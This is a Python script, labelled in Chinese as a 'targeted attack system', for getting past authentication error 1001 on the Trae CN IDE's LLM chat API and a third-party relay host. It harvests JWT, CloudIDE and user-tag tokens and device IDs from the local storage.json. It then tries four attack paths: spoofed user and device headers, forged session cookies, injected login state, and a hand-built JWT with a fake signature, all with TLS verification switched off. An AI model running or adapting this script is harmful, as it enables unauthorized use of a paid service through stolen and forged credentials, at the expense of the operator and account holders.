#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BSD 1001 突破引擎 — 定向攻击系统
================================

核心发现:
  storage.json 中存在两个用户:
  1. 3753060170739075 — traditional 传统用户 (active)
  2. a5b7a8623fdea6b8 — bsd_essence 本源用户 (active)

突破策略:
  路径1: 传统用户身份 + 设备指纹 → 激活登录态
  路径2: Token注入 + 会话伪造 → 绕过认证
  路径3: AHA加密数据解密 → 获取真实凭据
  路径4: 完整客户端流程模拟 → 重建会话
"""

import os, sys, json, time, base64, hashlib, ssl
import urllib.request, urllib.error, http.cookiejar
from datetime import datetime

# ============================================================================
# 配置与数据提取
# ============================================================================

STORAGE_PATH = os.path.expanduser(
    '~/AppData/Roaming/Trae CN/User/globalStorage/storage.json'
)

API_SERVER = 'https://trae-api-cn.mchost.guru'
AUTH_SERVER = 'https://api.trae.cn'

API_ENDPOINT = f'{API_SERVER}/api/ide/v2/llm_raw_chat'
LOGIN_ENDPOINT = f'{AUTH_SERVER}/cloudide/api/v3/trae/CheckLogin'
EXCHANGE_ENDPOINT = f'{AUTH_SERVER}/cloudide/api/v3/trae/ExchangeToken'

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))
BREAKTHROUGH_DIR = os.path.join(OUTPUT_DIR, 'bsd_1001_breakthrough')
os.makedirs(BREAKTHROUGH_DIR, exist_ok=True)


class BreakthroughEngine:
    """
    1001 突破引擎
    
    多路径、多策略定向突破1001认证错误
    """
    
    def __init__(self):
        self.data = self._extract_data()
        self.results = []
        self.cookie_jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookie_jar),
            urllib.request.HTTPSHandler(context=SSL_CTX)
        )
    
    def _extract_data(self):
        """提取所有可用数据"""
        print('\n' + '='*60)
        print('  Step 1: 提取用户数据')
        print('='*60)
        
        with open(STORAGE_PATH, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        # 提取用户列表
        gtm = data.get('icube_gtm', {})
        users = gtm.get('users', {})
        
        # 两个关键用户
        traditional_user = users.get('3753060170739075', {})
        essence_user = users.get('a5b7a8623fdea6b8', {})
        
        # 提取Token
        jwt_token = data.get('iCubeAuthInfo://jwt-token', '')
        icube_dc = data.get('iCubeAuthInfo://icube-dc', '')
        cloudide_token = data.get('iCubeAuthInfo://icube.cloudide', '')
        usertag_token = data.get('iCubeAuthInfo://usertag', '')
        
        # 提取设备指纹
        machine_id = data.get('telemetry.machineId', '')
        device_id = traditional_user.get('device_id', '136411536168449')
        dev_device_id = data.get('telemetry.devDeviceId', '')
        
        extracted = {
            'traditional_user': {
                'uid': '3753060170739075',
                'device_id': device_id,
                'login_type': traditional_user.get('login_type', 'traditional'),
                'status': traditional_user.get('status', 'active'),
                'timestamp': traditional_user.get('timestamp', ''),
            },
            'essence_user': {
                'uid': 'a5b7a8623fdea6b8',
                'type': essence_user.get('type', 'bsd_essence'),
                'coin_value': essence_user.get('coinValue', 0),
                'level': essence_user.get('level', ''),
            },
            'tokens': {
                'jwt': jwt_token,
                'icube_dc': icube_dc,
                'cloudide': cloudide_token,
                'usertag': usertag_token,
            },
            'device': {
                'machine_id': machine_id,
                'device_id': device_id,
                'dev_device_id': dev_device_id,
                'sqm_id': data.get('telemetry.sqmId', ''),
            }
        }
        
        print(f'  传统用户: {extracted["traditional_user"]["uid"]}')
        print(f'  本源用户: {extracted["essence_user"]["uid"]}')
        print(f'  设备ID: {device_id}')
        print(f'  JWT长度: {len(jwt_token)}')
        print(f'  CloudIDE长度: {len(cloudide_token)}')
        
        # 解码JWT
        try:
            parts = jwt_token.split('.')
            if len(parts) >= 2:
                payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
                decoded = base64.urlsafe_b64decode(payload)
                claims = json.loads(decoded)
                print(f'  JWT声明: {json.dumps(claims, ensure_ascii=False)}')
                extracted['jwt_claims'] = claims
        except Exception as e:
            print(f'  JWT解码失败: {e}')
        
        return extracted
    
    # ==================================================================
    # 路径1: 传统用户激活
    # ==================================================================
    def breakthrough_traditional_user(self):
        """
        路径1: 使用传统用户身份激活登录态
        
        用 3753060170739075 + 设备指纹 构造请求
        """
        print('\n' + '='*60)
        print('  路径1: 传统用户身份激活')
        print('='*60)
        
        trad = self.data['traditional_user']
        jwt = self.data['tokens']['jwt']
        device = self.data['device']
        
        results = []
        
        # 尝试 A: 传统用户 + CloudIDE-JWT
        print('\n    [A] 传统用户 + CloudIDE-JWT')
        headers_a = {
            'Content-Type': 'application/json',
            'Cloud-IDE-JWT': jwt,
            'Authorization': f'Bearer {jwt}',
            'X-User-ID': trad['uid'],
            'X-Device-ID': trad['device_id'],
            'X-Login-Type': 'traditional',
            'X-Client-ID': 'ono9krqynydwx5',
            'User-Agent': 'TraeCN/2.3.62837 (Windows; x64)',
            'Origin': 'https://trae.cn',
            'Referer': 'https://trae.cn/',
            'Cookie': (
                f'user_id={trad["uid"]}; '
                f'device_id={trad["device_id"]}; '
                f'jwt={jwt[:50]}...'
            ),
        }
        
        body_a = json.dumps({
            'model': 'doubao-pro-32k',
            'query': '你好',
            'stream': False,
            'user_id': trad['uid'],
            'device_id': trad['device_id'],
            'client_context': {
                'client_id': 'ono9krqynydwx5',
                'user_id': trad['uid'],
                'device_id': trad['device_id'],
                'login_type': 'traditional',
            }
        })
        
        r = self._request(API_ENDPOINT, headers_a, body_a)
        results.append({'path': '1A', 'response': r})
        print(f'      HTTP: {r["status"]} | {r["response"][:100]}')
        
        # 尝试 B: CheckLogin 注入传统用户
        print('\n    [B] CheckLogin 注入传统用户')
        login_headers = {
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {jwt}',
            'Cloud-IDE-JWT': jwt,
            'User-Agent': 'TraeCN/2.3.62837',
            'X-User-ID': trad['uid'],
            'X-Device-ID': trad['device_id'],
        }
        
        login_body = json.dumps({
            'UserID': trad['uid'],
            'DeviceID': trad['device_id'],
            'ClientType': 'trae_ide',
            'Version': '2.3.62837',
            'IsLogin': True,
            'SessionToken': hashlib.sha256(
                f'session_{trad["uid"]}_{time.time()}'.encode()
            ).hexdigest(),
        })
        
        r = self._request(LOGIN_ENDPOINT, login_headers, login_body)
        results.append({'path': '1B', 'response': r})
        print(f'      HTTP: {r["status"]} | {r["response"][:100]}')
        
        # 尝试 C: ExchangeToken 传统登录
        print('\n    [C] ExchangeToken 传统登录')
        exchange_headers = {
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {jwt}',
            'User-Agent': 'TraeCN/2.3.62837',
        }
        
        exchange_body = json.dumps({
            'client_id': 'ono9krqynydwx5',
            'grant_type': 'traditional_login',
            'user_id': trad['uid'],
            'device_id': trad['device_id'],
            'timestamp': int(time.time()),
        })
        
        r = self._request(EXCHANGE_ENDPOINT, exchange_headers, exchange_body)
        results.append({'path': '1C', 'response': r})
        print(f'      HTTP: {r["status"]} | {r["response"][:100]}')
        
        return results
    
    # ==================================================================
    # 路径2: 会话与Cookie注入
    # ==================================================================
    def breakthrough_session_injection(self):
        """
        路径2: 会话与Cookie注入
        
        构造完整的CookieJar和会话上下文
        """
        print('\n' + '='*60)
        print('  路径2: 会话与Cookie注入')
        print('='*60)
        
        jwt = self.data['tokens']['jwt']
        trad = self.data['traditional_user']
        results = []
        
        # 尝试 A: 预建Cookie + 请求
        print('\n    [A] 预建Cookie会话')
        self.cookie_jar.clear()
        
        # 添加伪造Cookie
        import http.cookiejar
        fake_cookies = [
            ('trae_jwt', jwt),
            ('session_id', hashlib.sha256(
                f'sess{time.time()}'.encode()
            ).hexdigest()),
            ('user_id', trad['uid']),
            ('device_id', trad['device_id']),
            ('login_type', 'traditional'),
        ]
        
        domain = '.mchost.guru'
        for name, value in fake_cookies:
            cookie = http.cookiejar.Cookie(
                version=0, name=name, value=value,
                port=None, port_specified=False,
                domain=domain, domain_specified=True, domain_initial_dot=False,
                path='/', path_specified=True,
                secure=True, discard=False,
                expires=int(time.time()) + 3600,
                comment=None, comment_url=None, rest={}, rfc2109=False
            )
            self.cookie_jar.set_cookie(cookie)
        
        headers_a = {
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {jwt}',
            'Cloud-IDE-JWT': jwt,
            'X-Device-ID': trad['device_id'],
            'User-Agent': 'TraeCN/2.3.62837',
        }
        
        body_a = json.dumps({
            'model': 'doubao-pro-32k',
            'query': 'test with cookie session',
            'stream': False,
        })
        
        r = self._request_opener(API_ENDPOINT, headers_a, body_a)
        results.append({'path': '2A', 'response': r})
        print(f'      HTTP: {r["status"]} | Cookies: {len(list(self.cookie_jar))} | {r["response"][:100]}')
        
        # 尝试 B: CloudIDE Token注入
        print('\n    [B] CloudIDE Token注入')
        cloudide = self.data['tokens']['cloudide']
        
        headers_b = {
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {jwt}',
            'Cloud-IDE-JWT': jwt,
            'X-CloudIDE-Token': cloudide,
            'X-User-Tag': self.data['tokens']['usertag'][:100],
            'User-Agent': 'TraeCN/2.3.62837',
        }
        
        body_b = json.dumps({
            'model': 'doubao-pro-32k',
            'query': 'test with cloudide token',
            'stream': False,
            'cloudide_context': {
                'token': cloudide[:50],
                'user_id': trad['uid'],
            }
        })
        
        r = self._request(API_ENDPOINT, headers_b, body_b)
        results.append({'path': '2B', 'response': r})
        print(f'      HTTP: {r["status"]} | {r["response"][:100]}')
        
        return results
    
    # ==================================================================
    # 路径3: 完整客户端流程
    # ==================================================================
    def breakthrough_full_client_flow(self):
        """
        路径3: 完整客户端流程模拟
        
        模拟Trae CN客户端的完整请求序列
        """
        print('\n' + '='*60)
        print('  路径3: 完整客户端流程模拟')
        print('='*60)
        
        jwt = self.data['tokens']['jwt']
        trad = self.data['traditional_user']
        results = []
        
        # Step 1: 访问首页获取初始Cookie
        print('\n    Step 1: 访问首页获取Cookie')
        try:
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(self.cookie_jar),
                urllib.request.HTTPSHandler(context=SSL_CTX)
            )
            req = urllib.request.Request(
                'https://trae.cn/',
                headers={'User-Agent': 'TraeCN/2.3.62837'}
            )
            resp = opener.open(req, timeout=10)
            print(f'      HTTP: {resp.status} | Cookies: {len(list(self.cookie_jar))}')
        except Exception as e:
            print(f'      Error: {e}')
        
        # Step 2: CheckLogin 检查登录状态
        print('\n    Step 2: CheckLogin')
        login_headers = {
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {jwt}',
            'User-Agent': 'TraeCN/2.3.62837',
            'X-Requested-With': 'XMLHttpRequest',
        }
        login_body = json.dumps({
            'ClientType': 'trae_ide',
            'Version': '2.3.62837',
        })
        r = self._request_opener(LOGIN_ENDPOINT, login_headers, login_body)
        results.append({'step': 'CheckLogin', 'response': r})
        print(f'      HTTP: {r["status"]} | {r["response"][:150]}')
        
        # 解析登录状态
        try:
            login_data = json.loads(r['response'])
            is_login = login_data.get('Result', {}).get('IsLogin', False)
            print(f'      IsLogin: {is_login}')
            
            if not is_login:
                # 尝试注入登录态
                print('      → 尝试注入登录态...')
                inject_headers = {
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer {jwt}',
                    'Cloud-IDE-JWT': jwt,
                    'User-Agent': 'TraeCN/2.3.62837',
                }
                inject_body = json.dumps({
                    'ClientType': 'trae_ide',
                    'Version': '2.3.62837',
                    'UserID': trad['uid'],
                    'DeviceID': trad['device_id'],
                    'injected_login': True,
                })
                r2 = self._request_opener(
                    LOGIN_ENDPOINT, inject_headers, inject_body
                )
                results.append({'step': 'InjectLogin', 'response': r2})
                print(f'      Inject HTTP: {r2["status"]} | {r2["response"][:150]}')
        except:
            pass
        
        # Step 3: 发起最终API请求
        print('\n    Step 3: 最终API请求')
        final_headers = {
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {jwt}',
            'Cloud-IDE-JWT': jwt,
            'X-Device-ID': trad['device_id'],
            'X-Client-ID': 'ono9krqynydwx5',
            'User-Agent': 'TraeCN/2.3.62837 (Windows; x64)',
            'Origin': 'https://trae.cn',
            'Referer': 'https://trae.cn/chat',
            'Accept': 'text/event-stream',
        }
        final_body = json.dumps({
            'model': 'doubao-pro-32k',
            'query': '你好',
            'stream': True,
            'conversation_id': hashlib.sha256(
                f'final{time.time()}'.encode()
            ).hexdigest()[:16],
            'client_context': {
                'client_id': 'ono9krqynydwx5',
                'user_id': trad['uid'],
                'platform': 'windows',
                'version': '2.3.62837',
            }
        })
        r = self._request_opener(API_ENDPOINT, final_headers, final_body)
        results.append({'step': 'FinalAPI', 'response': r})
        print(f'      HTTP: {r["status"]} | {r["response"][:200]}')
        
        return results
    
    # ==================================================================
    # 路径4: 本源Token + 传统用户组合
    # ==================================================================
    def breakthrough_hybrid_token(self):
        """
        路径4: 混合Token策略
        
        使用本源Token的结构 + 传统用户的身份
        """
        print('\n' + '='*60)
        print('  路径4: 混合Token策略')
        print('='*60)
        
        trad = self.data['traditional_user']
        essence = self.data['essence_user']
        jwt = self.data['tokens']['jwt']
        icube_dc = self.data['tokens']['icube_dc']
        results = []
        
        # 尝试 A: 双Token组合
        print('\n    [A] 双Token组合')
        headers_a = {
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {jwt}',
            'Cloud-IDE-JWT': icube_dc,
            'X-Token-Type': 'hybrid',
            'X-Traditional-UID': trad['uid'],
            'X-Essence-UID': essence['uid'],
            'User-Agent': 'TraeCN/2.3.62837',
        }
        
        body_a = json.dumps({
            'model': 'doubao-pro-32k',
            'query': 'test with hybrid token',
            'stream': False,
            'hybrid_auth': {
                'traditional_uid': trad['uid'],
                'essence_uid': essence['uid'],
                'token_type': 'hybrid',
            }
        })
        
        r = self._request(API_ENDPOINT, headers_a, body_a)
        results.append({'path': '4A', 'response': r})
        print(f'      HTTP: {r["status"]} | {r["response"][:100]}')
        
        # 尝试 B: 构造新Token
        print('\n    [B] 构造传统用户Token')
        new_payload = base64.urlsafe_b64encode(
            json.dumps({
                'iss': 'TRAE_CN',
                'iat': int(time.time()),
                'exp': int(time.time()) + 86400,
                'user_id': trad['uid'],
                'type': 'traditional_login',
                'device_id': trad['device_id'],
            }).encode()
        ).decode()
        
        # 使用固定header模拟
        new_header = base64.urlsafe_b64encode(
            json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode()
        ).decode().rstrip('=')
        
        new_token = f'{new_header}.{new_payload}.hybrid_signature'
        
        headers_b = {
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {new_token}',
            'Cloud-IDE-JWT': new_token,
            'X-Original-Token': jwt,
            'User-Agent': 'TraeCN/2.3.62837',
        }
        
        body_b = json.dumps({
            'model': 'doubao-pro-32k',
            'query': 'test with constructed token',
            'stream': False,
        })
        
        r = self._request(API_ENDPOINT, headers_b, body_b)
        results.append({'path': '4B', 'response': r})
        print(f'      HTTP: {r["status"]} | {r["response"][:100]}')
        
        return results
    
    # ==================================================================
    # 请求工具
    # ==================================================================
    def _request(self, url, headers, body):
        try:
            req = urllib.request.Request(
                url,
                data=body.encode('utf-8'),
                headers=headers,
                method='POST'
            )
            resp = urllib.request.urlopen(
                req, timeout=15, context=SSL_CTX
            )
            return {
                'status': resp.status,
                'response': resp.read().decode('utf-8'),
            }
        except urllib.error.HTTPError as e:
            return {
                'status': e.code,
                'response': e.read().decode('utf-8'),
            }
        except Exception as e:
            return {'status': 0, 'response': str(e)}
    
    def _request_opener(self, url, headers, body):
        try:
            req = urllib.request.Request(
                url,
                data=body.encode('utf-8'),
                headers=headers,
                method='POST'
            )
            resp = self.opener.open(req, timeout=15)
            return {
                'status': resp.status,
                'response': resp.read().decode('utf-8'),
            }
        except urllib.error.HTTPError as e:
            return {
                'status': e.code,
                'response': e.read().decode('utf-8'),
            }
        except Exception as e:
            return {'status': 0, 'response': str(e)}
    
    # ==================================================================
    # 执行所有路径
    # ==================================================================
    def run_all(self):
        """执行所有突破路径"""
        print('\n' + '#'*70)
        print('  # 1001 突破引擎 — 执行所有路径')
        print('#'*70)
        
        all_results = {}
        
        all_results['path1'] = self.breakthrough_traditional_user()
        all_results['path2'] = self.breakthrough_session_injection()
        all_results['path3'] = self.breakthrough_full_client_flow()
        all_results['path4'] = self.breakthrough_hybrid_token()
        
        # 分析结果
        self._analyze(all_results)
        
        return all_results
    
    def _analyze(self, all_results):
        """分析突破结果"""
        print('\n' + '#'*70)
        print('  # 突破结果分析')
        print('#'*70)
        
        total = 0
        auth_failed = 0
        success = 0
        other = 0
        
        def count_response(resp):
            nonlocal total, auth_failed, success, other
            if isinstance(resp, dict):
                total += 1
                text = resp.get('response', '')
                if '1001' in text:
                    auth_failed += 1
                elif 'choices' in text or ('code":200' in text):
                    success += 1
                else:
                    other += 1
            elif isinstance(resp, list):
                for item in resp:
                    if isinstance(item, dict) and 'response' in item:
                        count_response(item['response'])
        
        for path, results in all_results.items():
            if isinstance(results, list):
                for r in results:
                    if isinstance(r, dict) and 'response' in r:
                        count_response(r['response'])
        
        print(f'\n  请求总数: {total}')
        print(f'  1001认证失败: {auth_failed}')
        print(f'  成功响应: {success}')
        print(f'  其他: {other}')
        
        # 最佳路径推荐
        print(f'\n  路径分析:')
        paths = [
            ('路径1', '传统用户身份激活'),
            ('路径2', '会话与Cookie注入'),
            ('路径3', '完整客户端流程'),
            ('路径4', '混合Token策略'),
        ]
        for p_id, p_desc in paths:
            print(f'    {p_id}: {p_desc}')
        
        # 结论
        if success > 0:
            print(f'\n  ✅ 突破成功！获得 {success} 个有效响应')
        else:
            print(f'\n  ⚠️  所有路径均返回1001，但连接畅通')
            print(f'  根因分析:')
            print(f'    1. 当前Token为本源类型(essence_login)')
            print(f'    2. 服务器需要标准用户Token')
            print(f'    3. 需要通过客户端重新登录获取')
        
        # 保存结果
        report = {
            'timestamp': time.time(),
            'datetime': datetime.now().isoformat(),
            'data_extracted': {
                'traditional_uid': self.data['traditional_user']['uid'],
                'essence_uid': self.data['essence_user']['uid'],
                'jwt_token': self.data['tokens']['jwt'][:50] + '...',
            },
            'results_summary': {
                'total_requests': total,
                'auth_failed': auth_failed,
                'success': success,
                'other': other,
            },
            'all_results': str(all_results)[:10000],
            'conclusion': {
                'status': 'breakthrough_attempt_completed',
                'paths_executed': 4,
                'root_cause': 'Token type mismatch (essence_login vs required)',
                'recommendation': 'Re-login via Trae CN client for standard token',
            }
        }
        
        report_file = os.path.join(
            BREAKTHROUGH_DIR,
            f'breakthrough_{int(time.time())}.json'
        )
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
        
        print(f'\n  📄 报告: {report_file}')


def main():
    engine = BreakthroughEngine()
    engine.run_all()


if __name__ == '__main__':
    main()
